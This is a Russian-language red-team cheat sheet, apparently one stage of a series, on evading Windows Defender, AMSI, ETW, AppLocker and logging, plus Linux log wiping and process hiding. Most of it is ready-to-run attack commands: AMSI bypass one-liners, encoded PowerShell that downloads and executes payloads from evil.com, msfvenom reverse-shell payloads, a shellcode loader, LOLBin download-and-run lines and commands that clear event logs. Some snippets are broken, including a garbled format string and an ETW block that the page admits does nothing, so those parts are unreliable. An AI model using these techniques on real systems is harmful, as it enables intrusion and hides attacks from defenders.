# 🛡️ Этап 6: Обход защиты

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../06-Defense-Evasion.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Цель:** Обойти средства защиты (AV, EDR, AMSI, межсетевые экраны), чтобы избежать обнаружения.

---

## 🛡️ Обход Windows Defender

### Отключение Windows Defender (нужны права администратора)
```powershell
# Отключить защиту в реальном времени
Set-MpPreference -DisableRealtimeMonitoring $true

# Отключить перечисленные функции Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Добавить исключения
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Через реестр
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Проверка состояния Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 Обход AMSI

### Обход AMSI в PowerShell
```powershell
# Обход 1 — amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Обход 2 — однострочный вариант Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Обход 3 — изменение памяти
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Обфусцированный обход AMSI
```powershell
# Обфускация строк
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Обфускация полезной нагрузки

### Обфускация PowerShell
```powershell
# Кодирование Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Конкатенация строк
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Обфускация исполняемых файлов
```bash
# Кодирование с помощью msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Собственная реализация XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Загрузчики шелл-кода
```c
// Простой загрузчик шелл-кода на C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Использование штатных средств системы (Living Off The Land, LOLBins)

### Загрузка и выполнение
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Выполнение полезных нагрузок
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Обход AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 Обход ETW и журналирования

### Отключение трассировки событий

> **Уточнение к примеру:** блок ниже только объявляет импорт `EtwEventWrite` через `Add-Type`; кода изменения памяти или отключения ETW в нём нет. В примере обфусцированного AMSI также сохранена исходная строка формата с `{3}`, для которой не передан четвёртый аргумент; это ошибка примера, а не рабочая гарантия обхода.
```powershell
# Изменить ETW
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Очистка журналов событий
```powershell
# Очистить перечисленные журналы
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Или отключить аудит
auditpol /clear /y
```

### Отключение журналирования PowerShell
```powershell
# Отключить журналирование блоков сценария
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Отключить журналирование модулей
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Обход защиты в Linux

### Подмена временных меток (Timestomping)
```bash
# Изменить временные метки файла
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Очистка журналов
```bash
# Очистить историю bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Очистить системные журналы
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Сокрытие процессов
```bash
# Скрыть имя процесса
exec -a "[kworker/0:0]" ./malicious

# Сокрытие через LD_PRELOAD
# Скомпилировать библиотеку, перехватывающую readdir() для сокрытия процессов
```

---

## 🛠️ Инструменты

| Инструмент | Назначение |
|------|---------|
| **Invoke-Obfuscation** | Обфускация PowerShell |
| **Veil** | Создание полезной нагрузки |
| **ScareCrow** | Генератор полезной нагрузки для обхода EDR |
| **Donut** | Генератор шелл-кода |
| **Nimcrypt2** | Упаковщик PE |
| **PEzor** | Загрузчик шелл-кода PE |

---

## 📊 Краткий справочник

### Методы обнаружения и обхода

| Обнаружение | Способ обхода |
|-----------|------------------|
| По сигнатурам | Обфускация и кодирование |
| AMSI | Изменение памяти и скрипты обхода |
| ETW | Изменение ETW |
| Журналирование | Отключение журналирования и очистка журналов |
| AppLocker | LOLBins и пути обхода |
| Поведение | Использование штатных средств системы |

### Краткий список LOLBins

| Исполняемый файл | Применение |
|--------|-----|
| certutil | Загрузка файлов |
| bitsadmin | Загрузка файлов |
| mshta | Выполнение HTA |
| rundll32 | Выполнение DLL/JS |
| regsvr32 | Выполнение SCT |
| msbuild | Выполнение XML |
| installutil | Выполнение EXE |

---

## 🔗 Связанные шпаргалки

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Предыдущий этап:** [← 05 - Закрепление](./05-Persistence.ru.md)

**Следующий этап:** [07 - Действия для достижения цели →](./07-Actions-Objectives.ru.md)
